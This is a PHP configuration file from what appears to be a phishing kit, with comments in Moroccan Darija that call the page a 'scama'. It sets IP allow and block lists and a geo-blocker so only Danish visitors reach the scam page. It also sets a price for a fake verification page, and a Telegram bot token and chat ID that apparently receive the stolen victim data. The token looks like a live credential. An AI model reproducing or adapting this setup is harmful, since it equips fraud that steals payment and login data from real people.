<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/





$allowed_ips = ["IP_ADDRESS_1", "IP_ADDRESS_2", "IP_ADDRESS_3"]; // ip li bghiti ichofo scama
$blocked_ips = ["BLOCKED_IP_1", "BLOCKED_IP_2", "BLOCKED_IP_3"]; // ip li bghiti maydkhloch lscama

$blocker = "off"; // on = users blocked, off = users not blocked, on = li mn Denmark bo7dhom li ychofo scama, off = ga3 lboldan ichofo scama

$price = "00.00"; //taman li f verification page

$token = "7569076673:AAG0um_X_8xf6kvZ5OPADdfBLa6rvS_jG6k";
$chatid = "-4243478406";
